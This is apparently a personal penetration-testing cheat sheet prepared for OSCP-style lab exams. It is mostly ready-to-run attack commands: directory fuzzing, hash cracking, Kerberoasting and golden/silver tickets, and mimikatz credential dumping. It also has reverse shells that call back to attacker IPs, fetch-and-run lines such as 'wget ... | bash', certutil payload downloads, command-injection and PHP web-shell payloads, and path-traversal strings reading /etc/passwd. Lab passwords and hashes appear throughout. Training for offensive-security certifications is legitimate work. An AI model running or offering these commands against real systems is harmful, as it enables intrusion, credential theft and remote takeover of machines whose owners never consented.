feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.222.62/ -C 404,401,403,502,500 -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config
feroxbuster -u http://192.168.209.153:8000/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config -t 200
```

### gobuster
```bash
gobuster dir -u http://192.168.167.109/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

### nikto
```bash
# basic scanning
nikto -h vulnerable_ip
nikto -h vulnerable_ip -p 80, 8080, 8000
  + OPTIONS: WebDAV enabled (COPY PROPFIND MKCOL UNLOCK LOCK PROPPATCH listed as allowed): indicates that we might be able to use cadaver

# plugins
nikto -h vulnerable_ip --list-plugins
nikto -h 10.10.10.1 -Plugin apacheuser

# verbosing scan
nikto -h vulnerable_ip -Display 1
1: Show any redirects that are given by the web server.
2: Show any cookies received
E: Output any errors

# vulnerability searching
nikto -h vulnerable_ip -Tuning 0
| Category                          | Option |
|-----------------------------------|--------|
| File Upload                       | 0      |
| Misconfigurations / Default Files | 2      |
| Information Disclosure            | 3      |
| Injection                         | 4      |
| Command Execution                 | 8      |
| SQL Injection                     | 9      |

# save your findings
nikto -h http://ip_address -o report.html
```

### wfuzz
```bash
# Directory traversal&&API FUZZING
wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt http://192.168.234.16/FUZZ
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://192.168.234.16:5002/FUZZ/v1
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://192.168.234.16:5002/FUZZ/v2

# Fuzz for any files we can find
wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=FUZZ

wfuzz -w /home/kali/repos/projects/SecLists/Discovery/DNS/subdomains-top1million-110000.txt http://192.168.238.150:8080/search?FUZZ=FUZZ

# Fuzz for any files in our current directory
wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py
```

### ffuf
```bash
# dns(subdomain)
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://FUZZ.inlanefreight.com/

# vhosts fuzzing
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://marshalled.pg -H 'Host: FUZZ.marshalled.pg' -fs 868

ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u http://10.129.203.167 -H "HOST: FUZZ.inlanefreight.htb" -fs 10918

# directory fuzzing
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://94.237.49.166:43190/FUZZ

# file extension fuzzing
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ

# page fuzzing
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://94.237.49.166:43190/blog/FUZZ.php

# Recursion
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v

ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://faculty.academy.htb:43458/courses/FUZZ -e .php,.php7,.phps -v -fs 287,0 -recursion -recursion-depth 1

# GET parameter fuzzing
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:37235/admin/admin.php?FUZZ=key -fs 798

# POST parameter fuzzing
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:37235/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx

# value fuzzing
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx

##We can check this with curl
curl http://admin.academy.htb:37235/admin/admin.php -X POST -d 'id=73' -H 'Content-Type: application/x-www-form-urlencoded'
```

### xmllint
```bash
curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
```

### curl
![image](https://github.com/nuricheun/OSCP/assets/14031269/83b00a36-8468-4e38-a5c9-3cf2eb68cbbd)
```bash
# finger print
curl -IL https://www.inlanefreight.com

# with xmllint
curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -

# download files
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

# -v : When the web page looks like above, use -v for debugging and getting extra information about the response from server
We can find the stack information as well(ex. saltstack)
curl -v target:port

# directory traversal
curl --path-as-is http://192.168.x.x/../../../../../../etc/passwd
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# GET Request
## when you get 405 method not allowed, try something else other than GET such as POST or PUT etc.
curl -i http://192.168.50.16:5002/users/v1/admin/password

# POST Request
curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

# PUT Request
curl -X 'PUT' 'http://192.168.50.16:5002/users/v1/admin/password' -H 'Content-Type: application/json' -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' -d '{"password": "pwned"}'

# User-agent
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(...))</script>" --proxy 127.0.0.1:8080
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

### wget
```bash
# Download a file and execute it
wget -O - http://192.168.45.175:443/lse.sh | bash
```

### SCP
```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

### base64
```bash
# first get the encrypted value of the shell file
base64 shell -w 0
# revert it back to shell file..!
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell



```

### Python
```bash
# When encoding characters;
python3 -c 'import urllib.parse; original_string = "\n"; url_encoded_string = urllib.parse.quote(original_string); print(url_encoded_string);'
%0A
```

### Hashcat
```bash
# $2a: 3200
($2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS)
hashcat -m 3200 dora /usr/share/wordlists/rockyou.txt --force

# search for mode
hashcat -h | grep -i "kerberos"

# TGS-REP
hashcat -m 13100 mssql /usr/share/wordlists/rockyou.txt --force

# NTLMv2
hashcat -m 5600 thecybergeek /usr/share/wordlists/rockyou.txt --force

```

### John The Ripper
**john**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt offsec.hash

# Display already discovered hash
john hashname --show
```

**ssh2john**
```bash
$ ssh2john anita_id_rsa > ssh_key
$ hashcat -m 22911 ./ssh_key /usr/share/wordlists/rockyou.txt --force
```

**zip2john**
```bash
First check manually if it's password protected or not
zip2john sitebackup3.zip > zip.hash
```

### pspy
```bash
./pspy64 -pf -i 1000
```

### Cross Compiling
```bash
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
#  when the linker cannot find the winsock library
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

### xfreerdp
```bash
xfreerdp /u:administrator /p:qwertyuiop /v:10.3.26.190:3333 /cert:ignore
```

### rdesktop
```bash
rdesktop 192.168.216.165
```

### Rubeus
```bash
# kerberoast
./Rubeus.exe kerberoast /format:hashcat /outfile:mssql_hash

# asreproast
./Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
```

### kerbrute
```bash
# kerbrute username list: https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt

./kerbrute userenum --dc 10.10.x.x -d manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

./kerbrute userenum -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES>
./kerbrute passwordspray -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES> <% tp.frontmatter["PASSWORD"] %>
```


### Impacket
Get AD Users
```bash
impacket-GetADUsers -all -dc-ip 192.168.243.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192
```

**AS-REP Roasting**
```bash
# When we know that fsmith's hash is available(no password required)
impacket-GetNPUsers Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass

# When we don't know whos hashes are available and we want to use pete's credentials(correct username/password required)
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

**Kerberoasting**
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

**secretsdump**
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### LDAPSearch focus on samaccount and description
```bash
# unauthenticated
ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec' -s base namingcontexts
ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec' > ldap_search.txt
--> If we get the results
  # cat ldap_search.txt | grep -i "samaccountname" > raw_users.txt
  # cat raw_users.txt | cut -d: -f2 | tr -d " " > users.txt
  # user users.txt with kerbrute 

# authenticated(LAPS found from SYSVOL)
ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```


### Invoke-RunasCs.ps1
```bash
. .\Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command .\revshell443.exe
```

### GMSAPasswordReader
```bash
.\GMSAPasswordReader.exe --accountname svc_apache$
```

### smbserver
```bash
sudo smbserver.py -smb2support share $(pwd)
sudo smbserver.py -smb2support share $(pwd) -user kali -password kali
```

### Rogue LDAP Server
```bash
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
```

Make sure to press <No> when requested if you want to skip server configuration
![image](https://github.com/nuricheun/OSCP/assets/14031269/19d32655-1321-4ca1-b9eb-f9cf9a49f585)

For the DNS domain name, you want to provide our target domain, which is za.tryhackme.com
![image](https://github.com/nuricheun/OSCP/assets/14031269/c3cdb6b1-1ceb-49dd-8e44-65e732d35b64)

Use this same name for the Organisation name as well: 
![image](https://github.com/nuricheun/OSCP/assets/14031269/ef463b93-a993-40b6-8dd2-516f87bd4cfa)

Provide any Administrator password:
![image](https://github.com/nuricheun/OSCP/assets/14031269/85d54c2f-01de-45e6-bf4b-141b241d20eb)

Select MDB as the LDAP database to use:
![image](https://github.com/nuricheun/OSCP/assets/14031269/4a456705-471b-4551-97fb-bd619dbc5f6a)

For the last two options, ensure the database is not removed when purged:
![image](https://github.com/nuricheun/OSCP/assets/14031269/99675705-69a0-4ee5-96ec-b783a8e44b1a)

Move old database files before a new one is created:
![image](https://github.com/nuricheun/OSCP/assets/14031269/6eb3503c-f51d-415a-9c3d-c57785c767d8)

Create olcSaslSecProps.ldif
```bash
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

Now we can use the ldif file to patch our LDAP server using the following:
```bash
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

Capture traffic through tcpdump
```bash
sudo tcpdump -SX -i breachad tcp port 389
```


### gpp-decrypt(Groups.xml)
Group policy password
```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                                            
```

### crackmapexec
```bash
# local auth
--local-auth

#smb
crackmapexec smb 192.168.x.x -u '' -p '' --pass-pol
crackmapexec smb 192.168.x.x -u '' -p '' --shares
crackmapexec smb 192.168.x.x -u 'guest' -p '' --shares

crackmapexec smb 192.168.x.x -u 'username' -p 'password' --shares
crackmapexec smb 192.168.x.x -u username.txt -p 'password' --continue-on-success

#ssh
crackmapexec ssh 192.168.x.x -u 'username' -p 'password' --continue-on-success

#ftp
crackmapexec ftp 192.168.x.x -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success

#mssql
crackmapexec mssql 192.168.x.x -u sql_svc -p Dolphin1
crackmapexec mssql 10.10.85.148 -u sql_svc -p Dolphin1 -d oscp.exam --get-file "C:\TEMP\SAM" SAM

#winrm
crackmapexec winrm 192.168.x.x -u "<% tp.frontmatter["USERNAME"] %>" -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %>  --continue-on-success
crackmapexec winrm 192.168.x.x  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success
proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'certutil -urlcache -f http://192.168.45.176:8000/revshell7777.exe C:\Users\Public\revshell7777.exe'
proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'C:\Users\Public\revshell7777.exe'
```

### enum4linux
```bash
enum4linux -a 192.168.201.175
```

### SMBMAP
```bash
smbmap -H 192.168.x.x
smbmap -H 192.168.x.x -u '' -p ''
smbmap -u username -p password -d active.htb -H 192.168.193.5
```

### rpcclient
```bash
rpcclient 10.10.10.10
rpcclient 10.10.10.10 -U '' -N
> enumdomusers


>lookupnames administrator
> get the sid and change the user side at the very last part(500)
> user's sid start from 1000 so we can start enumerating from there
> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1000

for i in $(seq 500 4000);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

```

### SharpHound.ps1
```bash
powershell -ep bypass
. .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\TEMP\
```

### psexec
```bash
psexec.py active.htb/administrator@10.129.193.5
psexec.py -hashes '2f2b8d5d4d756a2c72c554580f970c14:2f2b8d5d4d756a2c72c554580f970c14' Administrator@192.168.190.247

When psexec not working
- crackmapexec smb -x whoami
- xfreerdp
- winrm
- See if we can upload files through shares using smbclient
```

### PrintSpoofer
```bash
iwr -uri http://192.168.45.176/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
iwr -uri http://192.168.45.176/nc.exe -Outfile nc.exe
.\PrintSpoofer.exe -c "C:\TEMP\nc.exe 192.168.45.176 1337 -e cmd"
```

### RoguePotato
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET.MACHINE.IP>:9999
## sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.217.247:9999

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=53 -f exe > reverse.exe
nc -nvlp 53

iwr -uri http://192.168.45.176/RoguePotato.exe -Outfile RoguePotato.exe
iwr -uri http://192.168.45.176/reverse.exe -Outfile reverse.exe

.\RoguePotato.exe -r 192.168.45.176 -l 9999 -e ".\reverse.exe"
```

### GodPotato
```bash
Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd ".\revshell7777.exe"
.\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
```
### mimikatz
```bash
privilege::debug
token::elevate

sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::sam
lsadump::lsa
```

### Invoke-Mimikatz
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:Egotistical-bank.local /user:Administrator"'
```

### Silver Tickets
![image](https://github.com/nuricheun/OSCP/assets/14031269/d19bd307-1d00-478a-925c-370b483dce13)
![image](https://github.com/nuricheun/OSCP/assets/14031269/472ec5a4-4224-4b09-b2c4-6662e97865d9)
```bash
#Get domain SID
whoami /user
#IIS service ntlm from mimikatz or somewhere
#mimikatz silver ticket attack
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
iwr -UseDefaultCredentials http://web04

# on kali machine
ticketer.py -spn SPN -domain-sid DOMAIN SID -nthash NTLM -dc-ip IP_VICTIM -domain domain Administrator
```

### Golden Tickets
```bash
# on windows
privilege::debug
lsadump::lsa
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
misc::cmd
PsExec64.exe \\DC1 cmd.exe

# on kali
impacket-ticketer -nthash 1693c6cefafffc7af11ef34d1c788f47 -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com Administrator
export KRB5CCNAME=./Administrator.ccache     
mousepad /etc/resolv.conf
    add > nameserver 192.168.x.x
(or add dc1.corp.com inside of /etc/hosts file otherwise this attack will fail)
psexec.py Administrator@dc1.corp.com -k -no-pass
```

### chisel
```bash
#chisel
#Run command on attacker machine
chisel server -p 8888 --reverse
#<socks>Run command on Web Server machine
 .  .\chisel.exe client <% tp.frontmatter["LHOST"] %>:8001 R:1080:socks
and edit the proxychains with the port that chisel provided

#When trying to connect to a local port
C:\\xampp\\htdocs>.\\chisel.exe client 192.168.45.176:8888 R:8090:localhost:80
```

### responder
```bash
sudo Responder -I tun0 -A
```

### Hydra
```bash
hydra <% tp.frontmatter["RHOST"] %> -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/<FILE> ftp|ssh|smb://<% tp.frontmatter["RHOST"] %>
hydra -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/rockyou.txt <% tp.frontmatter["RHOST"] %> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
hydra -I -f -L  -P passwords.txt 'http-post-form://192.168.243.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'

sudo hydra -L /usr/share/wordlists/rockyou.txt -p "<% tp.frontmatter["PASSWORD"] %>" rdp://<% tp.frontmatter["RHOST"] %>
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<% tp.frontmatter["RHOST"] %>
```

### socat
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<victim.ip.add.ress>:9999
```

### Cadaver
```bash
cadaver http://192.168.161.122/
``` 8

### dig
```bash
dig @10.10.10.161 AXFR htb.local
```

### dnsenum
```bash
dnsenum 192.168.162.122
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

### scp
```bash
# copy the ma.db to our AttackBox:
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .

```

### McAfee
- location: C:\Users\THM>cd C:\ProgramData\McAfee\Agent\DB\ma.db
- transfer files to kali linux: scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
- view contents with sqlitebrowser: sqlitebrowser ma.db
- focus on the AGENT_REPOSITORIES table
- check DOMAIN, AUTH_USER, and AUTH_PASSWD field
- crack credentials: https://github.com/funoverip/mcafee-sitelist-pwd-decryption

### WMI
```bash
# 
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop

# Remote Process Creation Using WMI
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

### dnsrecon
```bash
dnsrecon -d megacorpone.com -r 10.0.0.0/8
dnsrecon -d megacorpone.com -t std
dnsrecon -d megacorp.com -D ~/list.txt -t brt
```

### WinRM
```bash
# winrs.exe
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

### sc.exe
```bash
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

### smtp-user-enum
```bash
# with found usernames, use them against FTP, SSH ETC...
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.177.63
smtp-user-enum -M VRFY -U usernames.txt -t 10.129.182.186 -w 10
```

### bash
```bash
# search for flag.txt
find / 
```


### with powershell
```bash
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
Enter-PSSession -Computername TARGET -Credential $credential

or
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```




### bloodhound-python
```bash
bloodhound-python -u fmcsorley -p 'CrabSharkJellyfish192' -ns 192.168.216.122 -d hutch.offsec -c all
```

### pyLAPS.py -> get local administrator's password!
```bash
pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"
```

### snmpwalk(161)
```bash
snmpwalk -c public -v1 192.168.x.x
snmpwalk -v2c -c public 192.168.195.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
```


### Code Snippet to check where our code is executed
```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
```

### net
**Add user**
```bash
net user nuri password123! /add
net localgroup administrators nuri /add
```

### net on kali
```bash
<Add user to Remote Access group on kali linux using net> 
net rpc group addmem "REMOTE ACCESS" "Tracy.White" -U nara-security.com/Tracy.White%zqwj041FGX -S 192.168.193.30 
```

### PrivestCheck
```bash
```

### smbclient
```bash
smbclient -N -L \\\\10.129.42.253
smbclient \\\\10.129.42.253\\users
smbclient -U bob \\\\10.129.42.253\\users
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever

# download everything
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *
```


# SSH
## SSH connect
```bash
# ssh with private key
ssh -i id_rsa -p 2222 root@192.168.x.x 
```
## SSH Key
- See if other users can login as root using ssh key

```bash
# Generate ssh key:
ssh-keygen

# Connect with ssh key:
ssh -i id_rsa root@192.168.x.x

# To handle "Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures" error:
ssh -i id_rsa root@192.168.x.x -o IdentitiesOnly=yes
```

## SSH Tennling
```bash
# Local port forwarding
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215

# Local dynamic port forwarding
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

# Remote port forwarding
sudo systemctl start ssh
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4

# Remote dynamic port forwarding
ssh -N -R 9998 kali@192.168.118.4
```



# Web Attacks
## Checklist
- sudo nmap -p80 --script=http-enum 192.168.x.x
- Gobuster
- Feroxbuster
  - phpinfo.php --> check "DOCUMENT_ROOT"
- nikto
- curl -v
- burp suite
- subdomain using wfuzz
- USE BURP!! when logging in:: admin:admin admin:password admin:null
  - Check cookie(urldecode -> base64decode)
- CMS exploit
- View page/page sources
- Local File Inclusion
  - Click stuff to find out if we can find this ?file, ?page
  - ?page=C:/Windows/System32/drivers/etc/hosts
  - ?file=zip://uploads/upload_xkxkxk.zip%23simple-backdoor&cmd=whoami
  - ![image](https://github.com/nuricheun/OSCP/assets/14031269/c57b4849-394f-4fa5-a173-9548b31e9c06)
- Remote File Inclusion(RFI)
  - ?page=http://192.168.45.208/test.txt

- POST/GET with burp suite
- Any .config, .conf files?
- Combination with SQLi and other webpage that we know wehre its root location is

## Webroot
```bash
Apache	/var/www/html/
Nginx	/usr/local/nginx/html/
IIS	c:\inetpub\wwwroot\
XAMPP	C:\xampp\htdocs\
```

## General Tips
- Try "Jetty exploit", "Jetty RCE", "Jetty Remote Code Execution"...
- Open the website and view page/page sources
  - gobuster: wait until it is finished since some important directories show up later!(ex. /under_construction)
  - feroxbuster
  - run nikto
- We should try both POST and GET request using the key variable(ex. UC404)
  - Try with GET request
    - http://192.168.x.x/api?var=whoami
    - http://192.168.x.x/api?var=%0awhoami
    - http://192.168.x.x/api?var=;whoami
  - Try with POST request
    - Intercept the request with Burp Suite
- WAF bypass: X-Forwarded-For:127.0.0.1
- When we're dealing with python server, see if we can use os module and send "nc 192.168.45.175 80 -e /bin/sh" when we find data entry

## API Response
```bash
# curl -v can give you more information about this api
curl -v http://192.168.x.x:port

# Try sending get request to any found apis with found or possible argument
http://192.168.183.117:50000/verify?code=os

# Try sending post request to any found apis
curl -X post --data "code=2*2" http://192.168.183.117:50000/verify --proxy 127.0.0.1:8080
curl -X post --data "code=os.system('nc 192.168.45.175 80 -e /bin/sh')" http://192.168.183.117:50000/verify --proxy 127.0.0.1:8080
curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;nc 192.168.45.175 80 -e /bin/bash"}' -H 'Content-Type: application/json'  http://192.168.222.134:13337/update
```

## Filemanager
- See if any directory is showing same contents as ohter ports like FTP, SMB
- If our key file we should obtain is php file, we can't read it on the web so likely that we need to transfer it to FTP,SMB so make sure if any directory can be searched through smb/ftp
- When we're changing download path, try ./Documents/ or /Documents/ or Documents/

## Input Form
- SQLi? Command injection?
- Try with GET request
  - http://192.168.x.x/api?var=whoami
  - http://192.168.x.x/api?var=%0awhoami
  - http://192.168.x.x/api?var=;whoami
- Try with POST request
  - Intercept the request with Burp Suite



============ Directory Traversal && LFI ===========================================================================

## Directory Traversal
- Check DT vulnerability On windows: Check both absolute path && relative path
  - C:\Windows\System32\drivers\etc\hosts
  - C:\inetpub\logs\LogFiles\W3SVC1\
  - C:\inetpub\wwwroot\web.config
  - C:/Windows/boot.ini
  - C:/Windows/System32/drivers/etc/hosts
  - ../../../../../../../../../Windows/System32/drivers/etc/hosts
  - C:\xampp\apache\logs\access.log
- On Linux: Check both absolute path && relative path
  - /etc/passwd
  - curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
  - Check .ssh directory
  - /etc/php/7.4/apache2/php.ini
  - /var/log/apache2/access.log

### Filename Prefix
```bash
include("lang_" . $_GET['language']);

# We may be able to bypass filename prefix using / at the beginning
index.php?language=/../../../etc/passwd

```

### Second-Order Attacks
When a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png).
- we craft a malicious LFI username (e.g. ../../../etc/passwd)

### Non-Recursive Path Traversal Filters
```bash
....//
..././
....\/
?language=languages/....//....//....//....//flag.txt

```


### Bypass with URL Encoding
```bash
?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

### Approved Paths
we can fuzz web directories under the same path, and try different ones until we get a match
- /index.php?language=./languages/../../../../etc/passwd

### Bypass with file 
?file=zip://uploads/upload_xkxkxk.zip%23simple-backdoor&cmd=whoami

- Make sure to read and try exploit codes' examples
- Use curl --path-as-is or burp suite
- Check if we can read other vulnerable app's config file through this vulnerability
- Check other user's home directories to see the name of the files(pg practice cassandra)
- If wget doesn't work, maybe it only requires very simple way to get through: such as pivot as other users)

### Bypass Appended Extension
- null byte(%00)
- truncate

### PHP Filters
```bash
# Source Code Disclosure(WE NEED TO FUZZ)
mightyllama@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

index.php?language=php://filter/read=convert.base64-encode/resource=config
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

======================= PHP Wrappers ==============================================

### Data Wrapper
```bash
# first check if we can by checking php config file
## for apache
/etc/php/X.Y/apache2/php.ini
## for nginx
/etc/php/X.Y/fpm/php.ini

# Use curl to get config file
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# check if allow_url_include is on
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

